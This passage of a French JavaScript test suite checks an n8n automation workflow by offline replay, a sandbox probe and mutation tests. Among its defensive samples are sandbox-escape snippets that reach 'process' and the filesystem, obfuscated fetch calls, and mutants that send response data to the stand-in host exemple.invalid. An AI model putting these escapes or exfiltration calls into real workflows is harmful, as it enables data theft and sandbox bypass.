        if (!x.declenche && l.length) ko(`propriété du ${jour} : n° ${x.numero} (${x.compte}, ${x.etape}) : rien attendu sans la capacité crm`)
      }
    }
    // La propriété ne vaut que si le niveau 3 existe : sinon un juge qui ne voit plus rien passerait pour sûr.
    if (!parNiveau[3]) ko('propriété : aucun niveau 3 sur tout le jeu (le juge ne verrait plus rien)')
  } catch (err) { ko(`propriété : exception pendant le rejeu : ${err.message}`) }
  STATS.proprietes = { cases, constats, parNiveau }
  return e
}
const STATS = {}

// ─── 5. Le jeu de l'essai n8n (test_workflow, exécution 320) rejoué hors ligne ──────────────────────────────────────────────────
async function essaiN8n(wf) {
  const e = []
  const A1 = u(1), A2 = u(2)
  const donnees = {
    'Lire comptes': [{ id: A1, plan: 'studio' }, { id: A2, plan: 'signature' }],
    'Lire factures': [
      { id: u(101), artisan_id: A2, devis_id: null, statut: 'emise', date_echeance: '2026-10-23', total_ttc: 1200, avoir_de: null, payee_le: null, type_facture: 'standard' },
      { id: u(102), artisan_id: A1, devis_id: null, statut: 'emise', date_echeance: '2026-10-30', total_ttc: 500, avoir_de: null, payee_le: null, type_facture: null },
      { id: u(103), artisan_id: A2, devis_id: u(202), statut: 'payee', date_echeance: '2026-09-30', total_ttc: 900, avoir_de: null, payee_le: '2026-09-28', type_facture: 'acompte' },
    ],
    'Lire devis': [
      { id: u(201), artisan_id: A1, statut: 'accepte', date_emission: '2026-10-20', validite_jours: 90, acompte_pct: 30, total_ttc: 2000, lead_id: null, accepte_le: '2026-10-25T10:00:00+00:00', envoye_le: '2026-10-20T09:00:00+00:00', created_at: '2026-10-20T08:00:00+00:00' },
      { id: u(202), artisan_id: A2, statut: 'accepte', date_emission: '2026-09-01', validite_jours: 90, acompte_pct: 0, total_ttc: 3000, lead_id: null, accepte_le: '2026-09-05T10:00:00+00:00', envoye_le: '2026-09-01T09:00:00+00:00', created_at: '2026-09-01T08:00:00+00:00' },
      { id: u(203), artisan_id: A1, statut: 'envoye', date_emission: '2026-10-26', validite_jours: 90, acompte_pct: 0, total_ttc: 800, lead_id: null, accepte_le: null, envoye_le: '2026-10-26T09:00:00+00:00', created_at: '2026-10-26T08:00:00+00:00' },
      { id: u(204), artisan_id: A2, statut: 'envoye', date_emission: '2026-08-09', validite_jours: 90, acompte_pct: 0, total_ttc: 1500, lead_id: null, accepte_le: null, envoye_le: '2026-08-09T09:00:00+00:00', created_at: '2026-08-09T08:00:00+00:00' },
    ],
    'Lire demandes': [
      { id: u(301), artisan_id: A1, statut: 'nouveau', urgence: 'urgent', type_chantier: null, created_at: '2026-10-30T10:00:00+00:00' },
      { id: u(302), artisan_id: A2, statut: 'nouveau', urgence: null, type_chantier: null, created_at: '2026-11-01T10:00:00+00:00' },
    ],
    'Lire chantiers': [
      { id: u(401), artisan_id: A2, devis_id: u(202), statut: 'termine', date_fin_reelle: '2026-10-30', maj_le: '2026-10-30T17:00:00+00:00' },
      { id: u(402), artisan_id: A2, devis_id: null, statut: 'en_cours', date_fin_reelle: null, maj_le: '2026-10-31T17:00:00+00:00' },
    ],
    'Lire reservations': [{ id: u(501), artisan_id: A2, chantier_id: u(402), materiau_id: u(601), quantite: 5, statut: 'reserve' }],
    'Lire materiaux': [{ id: u(601), artisan_id: A2, seuil_alerte: 0 }, { id: u(602), artisan_id: A1, seuil_alerte: 3 }],
    'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }, { id: u(702), materiau_id: u(602), quantite: 1 }],
    'Lire relances impayes': [{ id: u(801), artisan_id: A2, facture_id: u(101), rang: 1, statut: 'envoyee' }],
    'Lire reglages des relances': [{ artisan_id: A2, actif: true, jours: [3, 10, 21] }],
    'Lire reglages de la plateforme': [{ artisan_id: A1, mode_reponse: 'assistee' }, { artisan_id: A2, mode_reponse: 'auto' }],
    'Lire tarifs': [{ id: u(901), artisan_id: A1, actif: true }],
    'Lire apres chantier': [{ artisan_id: A2, avis: true }],
  }
  // Bilan rendu par n8n le 02/11 (exécution 320 du workflow J8pduyxn9seR8Z9t), recopié de .orchestre/preuves/032-003/resume.md.
  const attendu = '1:2:170000:0/1/1 2:2:410000:0/2/0 3:1:60000:0/1/0 4:2:230000:0/1/1 5:0:0:0/0/0 6:2:0:0/1/1 7:1:0:0/1/0 8:1:150000:0/0/1 9:2:0:0/2/0 10:1:0:0/1/0'
  try {
    const { bilan, constats } = await passer(wf, donnees, '2026-11-02')
    controler('essai n8n', donnees, constats, (m) => e.push(m))
    const obtenu = bilan.map((b) => `${b.numero}:${b.nombre}:${b.montant_total_centimes}:${b.par_niveau['1']}/${b.par_niveau['2']}/${b.par_niveau['3']}`).join(' ')
    if (obtenu !== attendu) e.push(`bilan de l'essai n8n différent : ${obtenu}`)
  } catch (err) { e.push(`essai n8n : ${err.message}`) }
  return e
}

// ─── 6. É3 : le bac à sable prouve lui-même ses refus ─────────────────────────────────────────────────────────────────────────
// Le code d'évasion de l'annexe E de 032-010, à l'identique, puis une version qui rattrape chaque refus pour dire ce qu'elle atteint.
const EVASION_032_010 = "const g = Function('return this')(); return [{ json: { fetch_reel: typeof g['fe' + 'tch'], process_reel: typeof g['pro' + 'cess'], module_fs: typeof (g['pro' + 'cess'] && g['pro' + 'cess'].getBuiltinModule && g['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync) } }];"
const EVASION_RATTRAPEE = `const r = {};
const t = (k, f) => { try { const v = f(); r[k] = v === undefined || v === null ? 'rien' : typeof v } catch (e) { r[k] = 'refus' } };
t('global_par_Function', () => Function('return this')());
t('constructeur_hote', () => (function () {}).constructor('return process')());
t('constructeur_global', () => globalThis.constructor.constructor('return process')());
t('this_helpers', () => this['help' + 'ers']);
t('fetch', () => globalThis['fe' + 'tch']);
t('process', () => globalThis['pro' + 'cess']);
t('require', () => globalThis['req' + 'uire']);
t('eval_indirect', () => (0, globalThis['ev' + 'al'])('this'));
t('minuterie', () => globalThis['set' + 'Timeout']);
return [{ json: r }];`
async function bacASable() {
  const e = []
  const ko = (m) => e.push(m)
  try {
    const s = await BAC.demander({ type: 'sonde', fichier: EXPORT })
    STATS.sonde = s
    if (s.permission !== true) ko('bac à sable : le modèle de permissions de Node est inactif dans le processus enfant')
    for (const k of ['ecriture', 'lecture', 'processus', 'worker']) if (s[k] !== 'ERR_ACCESS_DENIED') ko(`bac à sable : ${k} ${s[k]} dans le processus enfant (ERR_ACCESS_DENIED attendu)`)
    const a = await BAC.demander({ type: 'executer', jsCode: EVASION_032_010, jour: JOUR })
    STATS.evasionE = a
    if (!a.erreur && !a.violations.length) ko(`bac à sable : l'évasion de l'annexe E (032-010) passe sans refus : ${JSON.stringify(a.items)}`)
    for (const x of a.items ?? []) for (const [k, v] of Object.entries(x ?? {})) if (v !== 'undefined') ko(`bac à sable : l'évasion de l'annexe E atteint ${k} (${v})`)
    const b = await BAC.demander({ type: 'executer', jsCode: EVASION_RATTRAPEE, jour: JOUR })
    STATS.evasionRattrapee = b
    const vu = b.items?.[0] ?? {}
    if (Object.keys(vu).length !== 9) ko(`bac à sable : l'évasion rattrapée n'a pas tout essayé (${JSON.stringify(vu)} ${b.erreur ?? ''})`)
    for (const [k, v] of Object.entries(vu)) if (v !== 'refus' && v !== 'rien') ko(`bac à sable : l'évasion rattrapée atteint ${k} (${v})`)
    if (b.violations.length < 6) ko(`bac à sable : les tentatives rattrapées ne sont pas toutes notées (${b.violations.join(', ')})`)
  } catch (err) { ko(`bac à sable : ${err.message}`) }
  return e
}

// La sonde du bac à sable ne dépend pas du workflow : elle tourne sur la suite principale, pas sur chaque mutant.
const suite = async (wf, { avecEmpreintes = true, avecSonde = false } = {}) => [
  ...(avecSonde ? await bacASable() : []), ...(avecEmpreintes ? empreintes(wf) : []), ...structure(wf), ...await copies(wf), ...await cas(wf), ...await proprietes(wf), ...await essaiN8n(wf),
]

// ─── Les mutants : chacun doit faire rougir la suite ──────────────────────────────────────────────────────────────────────────
// Un mutant du code est jugé SANS les empreintes (sinon l'empreinte seule le verrait toujours) : il prouve le rejeu, le test par
// propriété ou le bac à sable. `attendu` nomme la raison qui doit le faire rougir ; une autre raison ne compte pas.
function mutantCode(nom, de, vers) {
  const f = (wf) => {
    const m = copie(wf)
    const n = noeud(m, nom)
    if (!n.parameters.jsCode.includes(de)) throw new Error(`mutant introuvable dans ${nom} : ${de}`)
    n.parameters.jsCode = n.parameters.jsCode.replace(de, vers)
    return m
  }
  f.code = true
  return f
}
function mutantNoeud(nom, f) { return (wf) => { const m = copie(wf); f(noeud(m, nom), m); return m } }
const pagination = (n) => n.parameters.options.pagination.pagination
const MUTANTS = [
  ['n° 4 : comparateur de validité inversé (age > validite → age < validite)', mutantCode('Détecteur 04 devis sans réponse', 'if (age > validite(d)) continue;', 'if (age < validite(d)) continue;')],
  ['n° 1 : J+3 pile manqué (>= → >)', mutantCode('Détecteur 01 facture échue', 'retard >= x.jour', 'retard > x.jour')],
  ['n° 6 : étape inversée (>= → <)', mutantCode('Détecteur 06 demande sans réponse', 'age >= j', 'age < j')],
  ['n° 8 : borne inversée (> → <)', mutantCode('Détecteur 08 devis bientôt expiré', 'restant > S.devis_expire_avant_jours', 'restant < S.devis_expire_avant_jours')],
  ['n° 10 : J+2 pile manqué (< → <=)', mutantCode('Détecteur 10 demande d avis', 'age < S.avis_delai', 'age <= S.avis_delai')],
  ['n° 5 rallumé', mutantCode('Détecteur 05 facture jamais envoyée (coupé)', 'return [{ json: { constats: avant } }];', "return [{ json: { constats: avant.concat([{ numero: 5, detecteur: 'facture_jamais_envoyee', cle: 'facture_jamais_envoyee:x:j0', artisan_id: avant[0] && avant[0].artisan_id }]) } }];")],
  ['niveau : pilote et capacités d’envoi ignorés', mutantCode('Niveau proposé selon l offre', "l.includes('assistant.pilote') && d.auto.every((x) => l.includes(x))", 'true')],
  ['niveau : plafond du détecteur ignoré', mutantCode('Niveau proposé selon l offre', 'return Math.min(n, d.max);', "return d.outil === 'creer_devis' ? 3 : Math.min(n, d.max);")],
  ['constat qui porte un e-mail', mutantCode('Détecteur 04 devis sans réponse', "constat(4, 'devis_sans_reponse'", "nouveaux.push({ numero: 4, cle: 'devis_sans_reponse:' + d.id + ':x', client_email: 'x', artisan_id: d.artisan_id, niveau: 2 }); constat(4, 'devis_sans_reponse'")],
  ['copie des capacités faussée (crm retiré)', mutantCode('Capacités des offres', "'crm', 'assistant.pilote'", "'assistant.pilote'")],
  ['décision par le nom de l’offre', mutantCode('Niveau proposé selon l offre', "let n = l.includes('assistant') ? 2 : 1;", "let n = comptes.get(c.artisan_id).plan === 'studio' ? 2 : (l.includes('assistant') ? 2 : 1);")],
  ['colonne interdite dans select= (client_email)', mutantNoeud('Lire factures', (n) => { n.parameters.queryParameters.parameters[0].value += ',client_email' })],
  ['colonne hors liste (objet)', mutantNoeud('Lire devis', (n) => { n.parameters.queryParameters.parameters[0].value += ',objet' })],
  ['lecture HTTP en POST', mutantNoeud('Lire chantiers', (n) => { n.parameters.method = 'POST' })],
  ['nœud Supabase qui écrit', mutantNoeud('Lecture de connexion (regles_automatisation)', (n) => { n.parameters.operation = 'update' })],
  ['nœud Slack ajouté', (wf) => { const m = copie(wf); m.nodes.push({ name: 'Avertir', type: 'n8n-nodes-base.slack', parameters: {} }); return m }],
  ['appel réseau dans un nœud Code', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); fetch('https://exemple.invalid');")],
  ['workflow actif', (wf) => { const m = copie(wf); m.active = true; return m }],

  // ── É1 (032-010, annexe A : C2, C3, C4, puis les autres portes de sortie d'un nœud HTTP) ──
  ['É1 C2 pagination « next URL » vers un hôte tiers, avec l’identifiant', mutantNoeud('Lire factures', (n) => {
    const pg = pagination(n)
    pg.paginationMode = 'responseContainsNextURL'; delete pg.parameters
    pg.nextURL = "={{ 'https://exemple.invalid/collecte?d=' + encodeURIComponent(JSON.stringify($response.body)) }}"
    pg.paginationCompleteWhen = 'other'; pg.completeExpression = '={{ $pageCount >= 1 }}'
  }), { attendu: /pagination/ }],
  ['É1 C3 proxy sortant sur une lecture', mutantNoeud('Lire factures', (n) => { n.parameters.options.proxy = 'http://exemple.invalid:8080' }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 C4 certificats non vérifiés', mutantNoeud('Lire factures', (n) => { n.parameters.options.allowUnauthorizedCerts = true }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 redirections suivies', mutantNoeud('Lire devis', (n) => { n.parameters.options.redirect = { redirect: { followRedirects: true, maxRedirects: 21 } } }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 réponse complète (en-têtes rendus)', mutantNoeud('Lire devis', (n) => { n.parameters.options.response = { response: { fullResponse: true } } }), { attendu: /options HTTP hors gabarit/ }],
  ['É1 pagination : 5 000 pages', mutantNoeud('Lire comptes', (n) => { pagination(n).maxRequests = 5000 }), { attendu: /maxRequests/ }],
  ['É1 pagination sans plafond de pages', mutantNoeud('Lire comptes', (n) => { pagination(n).limitPagesFetched = false }), { attendu: /limitPagesFetched/ }],
  ['É1 pagination : fin jamais atteinte', mutantNoeud('Lire stock', (n) => { pagination(n).completeExpression = '={{ false }}' }), { attendu: /fin de pagination/ }],
  ['É1 pagination : un second paramètre (en-tête)', mutantNoeud('Lire stock', (n) => { pagination(n).parameters.parameters.push({ type: 'header', name: 'X-Suite', value: '={{ $response.body[0] }}' }) }), { attendu: /un seul paramètre qs offset/ }],
  ['É1 pagination : offset changé en select', mutantNoeud('Lire stock', (n) => { pagination(n).parameters.parameters[0].name = 'select'; pagination(n).parameters.parameters[0].value = '*' }), { attendu: /un seul paramètre qs offset/ }],
  ['É1 délai d’attente porté à 10 minutes', mutantNoeud('Lire tarifs', (n) => { n.parameters.options.timeout = 600000 }), { attendu: /timeout/ }],
  ['É1 second identifiant (en-tête générique)', mutantNoeud('Lire tarifs', (n) => { n.credentials.httpHeaderAuth = { id: 'x', name: 'Autre' } }), { attendu: /un seul identifiant/ }],
  ['É1 paramètre HTTP hors gabarit (sendHeaders posé à faux)', mutantNoeud('Lire tarifs', (n) => { n.parameters.sendHeaders = false }), { attendu: /paramètres HTTP hors gabarit/ }],
  ['É1 option de nœud hors gabarit (onError)', mutantNoeud('Lire tarifs', (n) => { n.onError = 'continueErrorOutput' }), { attendu: /clé de nœud non permise/ }],
  ['M10 (au passage) workflow d’erreur branché', (wf) => { const m = copie(wf); m.settings.errorWorkflow = 'AutreWorkflowQuiPosteSurSlack'; return m }, { attendu: /settings\.errorWorkflow/ }],

  // ── É2 (032-010, annexe A : D1-D6) — jugés sans les empreintes ──
  ['É2 D1 niveau 3 en Studio sur le n° 8 seulement', mutantCode('Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 8 && l.includes('relances'))) n = 3;"), { attendu: /plafond/ }],
  ['É2 D2 facture (creer_facture) au niveau 3 en Entreprise, n° 2', mutantCode('Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 2 && l.includes('organisation.membres')) ? 3 : niveau,"), { attendu: /plafond|geste §3\.2/ }],
  ['É2 D3 n° 7 au niveau 3 en Entreprise', mutantCode('Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 7 && l.includes('organisation.membres')) ? 3 : niveau,"), { attendu: /plafond/ }],
  ['É2 D4 niveau 3 en Studio en mode « auto » (n° 6, dès J+3)', mutantCode('Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 6 && modeAuto.has(c.artisan_id) && !l.includes('crm') && c.jours >= 3)) n = 3;"), { attendu: /plafond/ }],
  ['É2 D5 Studio niveau 3 sur le n° 9 (stock, CRM absent)', mutantCode('Niveau proposé selon l offre', 'return Math.min(n, d.max);', "return (c.numero === 9 && c.objet.type === 'materiau') ? 3 : Math.min(n, d.max);"), { attendu: /plafond/ }],
  ['É2 D6 facture d’acompte au niveau 3 en Signature dès 1 000 €', mutantCode('Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 3 && c.montant_centimes >= 100000 && l.includes('assistant.pilote')) ? 3 : niveau,"), { attendu: /plafond|geste §3\.2/ }],
  ['É2 n° 1 au niveau 3 en Signature sans impayés cochés', mutantCode('Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 1 && l.includes('assistant.pilote') && c.montant_centimes >= 1000000)) n = 3;"), { attendu: /plafond/ }],
  ['É2 outil de la facture renommé pour sortir de OUTILS_JAMAIS_AUTO', mutantCode('Niveau proposé selon l offre', "2: { outil: 'creer_facture', max: 2,", "2: { outil: 'preparer_facture', max: 3,"), { attendu: /outil preparer_facture/ }],

  // ── É3 (032-010, annexe A : C5, C6, annexe E) — jugés sans les empreintes : le bac à sable doit les arrêter ──
  ['É3 C5 appel réseau masqué (this[\'help\'+\'ers\'][\'http\'+\'Request\'])', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); const h = (typeof this === 'object' && this) ? this['help' + 'ers'] : null; if (h && h['http' + 'Request']) h['http' + 'Request']({ url: 'https://exemple.invalid' });"), { attendu: /bac à sable/ }],
  ['É3 C6 fetch masqué (globalThis par Function)', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); const f = Function('return this')()['fe' + 'tch']; void f;"), { attendu: /bac à sable/ }],
  ['É3 annexe E : process et disque par Function, refus rattrapé', mutantCode('Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); try { const g = Function('return this')(); g['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync('x', 'y'); } catch (e) { /* silence */ }"), { attendu: /bac à sable/ }],
  ['É3 constructeur de l’hôte (this.constructor.constructor), rattrapé', mutantCode('Détecteur 01 facture échue', 'const nouveaux = [];', "const nouveaux = []; try { ({}).constructor.constructor('return process')(); } catch (e) { /* silence */ }"), { attendu: /bac à sable/ }],
  ['É3 minuterie masquée (setTimeout)', mutantCode('Détecteur 06 demande sans réponse', 'const nouveaux = [];', "const nouveaux = []; try { globalThis['set' + 'Timeout'](() => 0, 1); } catch (e) { /* silence */ }"), { attendu: /bac à sable/ }],
  ['É3 empreinte : un espace ajouté au code audité', mutantCode('Bilan par détecteur', 'const vues = new Set();', 'const vues = new Set(); '), { avecEmpreintes: true, attendu: /nouvel audit requis/ }],
  ['É3 empreinte : fetch masqué dans un nœud non rejoué (Preuve de connexion)', mutantCode('Preuve de connexion', "return [{ json: { connexion: 'ok', lignes: lignes.length } }];", "try { Function('return this')()['fe' + 'tch']('https://exemple.invalid/?d=' + encodeURIComponent(JSON.stringify(rendus))); } catch (e) { /* silence */ } return [{ json: { connexion: 'ok', lignes: lignes.length } }];"), { avecEmpreintes: true, attendu: /nouvel audit requis/ }],
  ['É3 empreinte : nœud Code ajouté', (wf) => { const m = copie(wf); m.nodes.push({ id: 'x', name: 'Code ajouté', type: 'n8n-nodes-base.code', typeVersion: 2, position: [0, 0], parameters: { mode: 'runOnceForAllItems', language: 'javaScript', jsCode: 'return [];' } }); return m }, { attendu: /nouvel audit requis/ }],
]

// ─── Lancement ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
const debut = Date.now()
const echecs = await suite(WF, { avecSonde: true })
const statsVert = JSON.parse(JSON.stringify(STATS))
let mutantsVerts = 0
for (const [titre, fabriquer, options = {}] of MUTANTS) {
  const avecEmpreintes = options.avecEmpreintes ?? !fabriquer.code
  let rougit, raison = ''
  try {
    const erreurs = await suite(fabriquer(WF), { avecEmpreintes })
    const bonnes = options.attendu ? erreurs.filter((m) => options.attendu.test(m)) : erreurs
    rougit = bonnes.length > 0
    raison = (bonnes[0] ?? erreurs[0] ?? '').slice(0, 200)
    if (!rougit && erreurs.length) raison = `rouge, mais pas pour la raison attendue (${options.attendu}) : ${raison}`
  } catch (err) { raison = `mutant inapplicable : ${err.message}`; rougit = false }
  console.log(`  ${rougit ? '✓' : '✗'} mutant « ${titre} »${avecEmpreintes ? '' : ' [sans empreintes]'} ${rougit ? 'fait rougir la suite' : 'NE FAIT PAS rougir la suite'}${raison ? `\n      → ${raison}` : ''}`)
  if (!rougit) mutantsVerts++
}
BAC.fermer()
const nbCodes = WF.nodes.filter((n) => n.type === 'n8n-nodes-base.code').length
console.log(`detecteurs-n8n-qa : ${WF.nodes.length} nœuds (${nbCodes} Code, ${LECTURES(WF).length} lectures GET), ${MUTANTS.length} mutants, ${Math.round((Date.now() - debut) / 1000)} s`)
if (echecs.length || mutantsVerts) {
  for (const e of echecs) console.log(`  ✗ ${e}`)
  if (mutantsVerts) console.log(`  ✗ ${mutantsVerts} mutant(s) laissent la suite verte`)
  console.log('ÉCHEC')
  process.exit(1)
}
const s = statsVert.sonde, p = statsVert.proprietes
console.log('  ✓ structure : inactif, lectures seules, select= limité aux colonnes permises, aucune écriture, aucun envoi, aucun modèle')
console.log('  ✓ É1 gabarit HTTP exact : parameters, options, pagination (offset seul, fin exacte, ≤ 50 pages), un seul identifiant')
console.log(`  ✓ É3 empreintes : ${EMPREINTES.size} nœuds Code épinglés (sha256), identiques au code audité`)
console.log(`  ✓ É3 bac à sable : processus enfant ${BAC.drapeaux.join(' ')} (Node ${s.node}) — écriture ${s.ecriture}, lecture ${s.lecture}, processus ${s.processus}, worker ${s.worker} ; réseau ${s.reseau === 'ERR_ACCESS_DENIED' ? 'ERR_ACCESS_DENIED' : s.reseau + ' (Node ' + s.node + ' n’a pas de barrage réseau : le code n’y atteint pas, faute de tout objet de l’hôte dans son contexte — voir l’évasion ci-dessous)'}`)
console.log(`  ✓ É3 évasion de l’annexe E (032-010) : ${statsVert.evasionE.erreur ? 'refusée (' + statsVert.evasionE.erreur.slice(0, 80) + ')' : 'sans effet'} ; version rattrapée : ${JSON.stringify(statsVert.evasionRattrapee.items[0])}`)
console.log('  ✓ copies : capacités = lib/plans.ts ; listes d’outils = lib/pilote/regles.ts ; seuils sourcés = le code')
console.log('  ✓ détecteurs : déclenchent, se taisent, tiennent à la limite, changent de clé d’étape ; n° 5 muet ; n° 7 jamais 3')
console.log(`  ✓ É2 propriété : ${p.cases} cas (10 détecteurs × 3 offres × impayés × réponse × étapes × montants de 1 € à 100 000 €, ${JOURS_PROPRIETE.length} jours), ${p.constats} constats, niveaux ${JSON.stringify(p.parNiveau)}, tous ≤ plafond(offre, détecteur) ; outil de OUTILS_JAMAIS_AUTO ⇒ niveau ≤ 2 sur chaque constat de chaque cas`)
console.log('  ✓ essai n8n (exécution 320) rejoué hors ligne : même bilan')
console.log('OK')
